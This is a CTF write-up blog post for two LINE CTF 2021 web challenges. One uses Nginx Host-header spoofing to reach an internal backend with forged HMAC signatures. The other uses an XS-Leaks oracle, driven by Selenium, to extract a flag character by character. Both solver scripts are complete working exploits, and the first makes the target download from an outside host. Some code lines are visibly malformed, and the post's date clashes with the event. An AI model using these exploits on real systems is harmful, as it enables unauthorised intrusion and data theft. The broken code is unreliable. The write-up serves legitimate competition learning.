---
id: writeup-of-line-ctf-2021-english-ver
title: LINE CTF 2021 Writeup ([Web] diveinternal, Your note) - [English]
publishedAt: 2020-03-21T04:14:00.000Z
tags: [CTF, Writeup, Web Security, Nginx, SSRF, Host Spoofing, Python, XS-Leaks]
---

Hello, this is 8ayac🧽
This article is a two-question Writeup solved in [LINE CTF 2021](https://ctftime.org/event/1269).
The problems I solved are diveinternal and Your Note[^1].

Since freshness is essential for gratitude, apology, and Writeup, the content is simple without a detailed explanation. [^2]
Please note that the explanation is basically for those who know the problem's content, and the context is largely omitted.

日本語版は[こちら](http://blog.8ay.ac/2021-03-21/writeup-of-line-ctf-2021)

## [Web 50pts] diveinternal (65/680 Solves)

### Problem

```txt
Target the server's internal entries, access admin, and rollback.

Keytime: Asia/Japan

Attachment: diveInternal.zip
```

### Writeup

A scan of the distributed `nginx.conf` with [gixy](https://github.com/yandex/gixy) revealed a flawed configuration.
Specifically, it was vulnerable to the host header forgery [^3].
Below are the actual scan results by gixy.

```shell-session
$ gixy nginx/nginx.conf

==================== Results ===================

>> Problem: [host_spoofing] The proxied Host header may be spoofed.
Description: In most cases "$host" variable are more appropriate, just use it.
Additional info: https://github.com/yandex/gixy/blob/master/docs/en/plugins/hostspoofing.md
Pseudo config:

server {
        server_name nginx;

        location / {
                proxy_set_header Host $http_host;
        }
}

==================== Summary ===================
Total issues:
    Unspecified: 0
    Low: 0
    Medium: 1
    High: 0
```

Next, it turned out that the vulnerability caused by this Nginx config could be used to access the back-end app directly.
Specifically, I could issue an arbitrary HTTP request (But it's only the GET method[^4]).

The URL to which the request is forwarded can be freely specified to some extent, as shown below.

- Scheme: Unconfirmed (this time it is enough to use `http`)
- Host (including port): In a legitimate request that occurs on a vulnerable endpoint, if you rewrite the value of the header `Host`, that value becomes the host part of the forward URL.
- Path + query string: In a legitimate request that occurs on a vulnerable endpoint, if you rewrite the value of the header `Lang`, it becomes the path of the URL to which you are forwarding.[^5]

After that, I organized the specifications of the back-end application and just did a puzzle.
For details, refer to Solver described later.

<details>
<summary>
    Notes on backend app specifications
</summary>

### class `Activity` in `app.main`

#### Instance variables

|Name|Description|Notes|
|-|-|-|
|`engine`|DB operation engine|DBMS is SQLite|
|`session`|DB session object||
|`dbHash`|DB integrity verification hash|`hashlib.md5(open(os.environ['DBFILE'], 'rb').read())).hexdigest()`|
|`integrityKey`|Key for verifying the integrity of dbHash |`hashlib.sha512((self.dbHash).encode('ascii')).hexdigest()`|
|`subscriberObjs`|List of pre-existing Subscriber objects||
|`backupdHash`|||

#### Methods

|Method|Description|Notes|
|-|-|-|
|`__init__(self)`|Just a constructor||
|`DbBackupRunner (self)`|Perform DB rollback|Using `app.rollback ()`|
|`Commit(self)`|Commi data to DB|This is called if commit fails|
|`UpdateKey(self)`|Update `self.integrityKey` and `self.dbHash` properly||
|`IntegrityCheckWorker(self)`|The worker to perform "IntegrityCheck" of DB file using `self.dbHash`|Used for regular runs by `self.run`|
|`IntegrityCheck(self, key, dbHash)`|Use the argument `dbHash` to verify that the DB has not been unintentionally changed.|The contents of `FLAG` are read and returned when an unintended change is detected. (???)|
|`AddSubscriber(self, email`)|Register new Subscriber data in DB|More information about Subscriber: `app.datamodel.Subscriber`|
|`ScheduleWorker`|Worker which periodically executes DB Integrity Check||
|`run`|Periodically execute DB Integrity Check||

### Utilities in `app.main`

|Function|Description|Notes|
|-|-|-|
|`valid_download(src)`|Verify if src is specified||
|`WriteFile(url)`|Writes the content of the page specified by the argument to file X.|File X: f`backup/${url.split('/')[-1]}`|
|`LanguageNomarize(request)`|Normalize the value of request header `Lang`|After normalizing, throw a GET request to f`${request.host_url}{language}`. If the response code for the request is 200, the response body string is returned.|
|`list_routes()`|Ommited||
|`SignCheck(request)`|Perform HMAC verification on the query string of the reques|Used in `GET /rollback` and `GET or POST /rollback.`|

### Utilities in `app.rollback`

|Function|Description|Notes|
|-|-|-|
|`RunRollbackDB(dbhash)`|Roll back the DB|Under `backup/`, if there is a file with the name of the argument `dbhash` with all symbol removed, it will (strangely) read and return the contents of FLAG.|
|`RunbackupDB(remove, dbhash)`|Ommited||

### Endpoints

|Endpoint|Description|Notes|
|-|-|-|
|`GET /index`|Top Page||
|`GET /en`|Ommited||
|`GET /jp`|Ommited||
|`GET /coin`|API to return coin price information|The value of the response header `Lang` has been normalized by `app.main.LanguageNomarize(request)`.|
|`GET /download`|Download the URL specified by the parameter `src`|Use `app.main.download(src)` to download|
|`POST /download`|Same as `GET / download`||
|`GET /addsub`|API for new Subscriber registration||
|`GET /integrityStatus`|API for checking DB integrity status|You can get the DB file path and the value of the current DB consistency verification hash(`dbHash`).|
|`GET /rollback`|API for DB rollback|If you pass `app.main.SignCheck (request)`, `app.main.Activity.IntegrityCheck` will be executed. The value of the request header `Key` is passed as the argument `key`. The value of `dbhash` specified in the query string is passed to the argument `dbHash`.|

</details>

### Solver

```py
import hashlib
import hmac
import json
from urllib.parse import urljoin

import requests

PUBLIC_BASE_URL = 'http://35.190.234.195/'
PRIVATE_HOST = 'localhost:5000'

PRIVATE_KEY = b"let'sbitcorinparty"

def get_db_hash() -> str:
    res = requests.get(urljoin(PUBLIC_BASE_URL, '/'),
                       headers={
                           'Host': PRIVATE_HOST,
                           'Lang': 'integrityStatus'
                       })
    return json.loads[res.headers['lang']]('dbhash')

def generate_sign(s: str) -> str:
    return hmac.new(PRIVATE_KEY, s.encode(), hashlib.sha512).hexdigest()

def generate_key(s: str) -> str:
    return hashlib.sha512(s.encode('ascii')).hexdigest()

def add_prefix(s: str, prefix: str) -> str:
    return f'{prefix}{s}'

def execute_download(srcUrl: str) -> requests.Response:
    sign = generate_sign(f'src={srcUrl}')
    return requests.get(urljoin(PUBLIC_BASE_URL, '/'),
                        headers={
                            'Host': PRIVATE_HOST,
                            'Lang': f'download?src={srcUrl}',
                            'Sign': sign
                        })

def execute_rollback(dbHash: str) -> requests.Response:
    FRAGMENT = '_'

    key = generate_key(dbHash)
    sign = generate_sign(f'dbhash={add_prefix(dbHash, FRAGMENT)}')

    return requests.get(urljoin(PUBLIC_BASE_URL, '/'),
                        headers={
                            'Host': PRIVATE_HOST,
                            'Lang': f'rollback?dbhash={add_prefix(dbHash, FRAGMENT)}',
                            'Key': key,
                            'Sign': sign
                        })

def exploit():
    execute_download(f'<https://lab.8ay.ac/{get_db_hash>()}')
    res = execute_rollback(get_db_hash())

    print(f'flag: {res.headers["lang"]}')

if __name__ == "__main__":
    exploit()

```

### Flag

`LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}`

## [Web 50pts] Your Note (22/680 Solves)

### Problem

```txt
Secure private note service
※ Admin have disabled some security feature of their browser...

Flag Format: LINECTF{[a-z0-9-]+}

添付ファイル: your-note.zip
```

### Writeup

The next part of the `GET /search` source code looked suspicious.

```py
@app.route('/search')
@login_required
def search():
    q = request.args.get('q')
    download = request.args.get('download') is not None
    if q:
        notes = Note.query.filter_by(owner=current_user).filter(or_(Note.title.like(f'%{q}%'), Note.content.like(f'%{q}%'))).all()
        if notes and download:
            return Response(json.dumps(NoteSchema(many=True).dump(notes)), headers={'Content-disposition': 'attachment;filename=result.json'})
    else:
        return redirect(url_for('index'))
    return render_template('index.html', notes=notes, is_search=True)
```

Looking at lines 8-9, you can see that `Content-disposition: attachment` is included in the response header when all of the following conditions are met.

- Have one or more Notes
- `request.args.get('download')` is not None

In short, after giving `?download=` as the query string, the result of executing the search function is divided as follows.

|Count of Notes|There's `Content-disposition: attachment`|
|:-:|:-:|
|One or more|✅|
|Less than one|✖|

I expected we could obtain that flag with XS Leaks, which uses this property as an oracle.
When I reported the URL `{{BASE_URL}}/search?q=%&download`[^ 6] to the administrator, I got an unusual message of`ng`, so this prediction was correct.

### Solver

Using the Solver below, I extracted the flag string character by character from the beginning.[^7]

```py
import os
import string
import subprocess
from concurrent.futures.thread import ThreadPoolExecutor
from urllib.parse import quote, urljoin

from selenium import webdriver
from selenium.webdriver.chrome.options import Options

BASE_URL = os.getenv('BASE_URL')

USERNAME = os.getenv('USERNAME')
PASSWORD = os.getenv('PASSWORD')

S = string.ascii_lowercase + string.digits + '-'

FLAG_PRE = 'LINECTF{'
FLAG_SUF = '}'

def length_is(n: int) -> str:
    return f'{FLAG_PRE}{"_" * n}{FLAG_SUF}'

def nth_char_is(n: int, c: str) -> str:
    return f'{FLAG_PRE}{"_" * (n - 1)}{c}%{FLAG_SUF}'

def prop_holds(prop: str):
    print(f"\r[info] Attempting this prop => '{prop}'\033[0K", end='')

    options = Options()
    options.add_argument('--headless')
    driver = webdriver.Chrome(os.getenv('CHROME_DRIVER_PATH'), options=options)
    try:
        # Login
        driver.get(urljoin(BASE_URL, '/login'))
        driver.find_element_by_css_selector('input[name=username]').send_keys(USERNAME)
        driver.find_element_by_css_selector('input[name=password]').send_keys(PASSWORD)
        driver.find_element_by_css_selector('button[type=submit]').submit()

        # Move to /report
        report_bug_button = driver.find_element_by_css_selector('a.button.is-warning.is-light')
        report_bug_button.click()

        # Proof of work
        pow_cmd = driver.find_element_by_tag_name('strong').get_attribute('textContent').split('&&')[-1].strip()
        proof = subprocess.check_output(pow_cmd, shell=True).decode()

        # Make the payload
        payload = urljoin(BASE_URL, f'/search?q={prop}&download=')

        # Submit the payload
        driver.find_element_by_css_selector('input[name=url]').send_keys(payload)
        driver.find_element_by_css_selector('input[name=proof]').send_keys(proof)
        driver.find_element_by_css_selector(
            '#content > div > div > div.box > form > div:nth-child(4) > p > button').submit()

        # Check the result
        flash_message_el = driver.find_element_by_css_selector(
            '#content > div > div > div.box > form > div:nth-child(6)')
        truth = flash_message_el.get_attribute('textContent').strip() == 'ng'

        return prop, truth

    except Exception as e:
        return prop, False

    finally:
        driver.close()

def backup(revealed_flag: str):
    with open('flag.bak', mode='w') as f:
        f.write(revealed_flag)

if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=8) as executor:
        upper_bound = 50
        props = [length_is(i) for i in range(1, upper_bound + 1)]
        secret_length = [v[0].count('_') for i, v in enumerate(list(executor.map(prop_holds, props))) if v[1]].pop()

    print(f'\r[+] secret_length: {secret_length}\033[0K')

    secret = ''
    for i in range(1, secret_length + 1):
        with ThreadPoolExecutor(max_workers=4) as executor:
            props = [nth_char_is(i, c) for c in S]
            possible_chars = [v for v in executor.map(prop_holds, props) if v[1]]
            if len(possible_chars) == 1:
                secret += possible_chars.pop()[0].lstrip(f'{FLAG_PRE}{"_" * (i - 1)}').rstrip(f'%{FLAG_SUF}')
            else:
                secret += '?'

            print(f'\r[+] ~N={i} => {secret}\033[0K')
            backup(f'{FLAG_PRE}{secret}')

    print(f'[*] flag: {FLAG_PRE}{secret}{FLAG_SUF}')

```

### Flag

`LINECTF{1-kn0w-what-y0u-d0wn10ad}`

## Footnotes

[^1]: I solved this with my teammate [@y0d3n](https://twitter.com/y0d3n).
[^2]: I feel that there is a relatively good way to put out a simple Writeup for the time being and give a detailed explanation at the review's timing.
[^3]: FYI: <https://qiita.com/no1zy_sec/items/dfccd91cf76bf73b7754>
[^4]: I didn't investigate if we could issue other method requests because it was enough to get the flag if there was a GET request.
[^5]: After being forwarded, it may be normalized using `app.main.LanguageNomarize (request)`.
[^6]: `%` is a wildcard that represents a string of 0 or more characters
[^7]: Actually, the manual leak by teammate [@y0d3n](https://twitter.com/y0d3n) was faster, but from a privacy point of view, instead of his face photo, The Solver script by Python is posted.
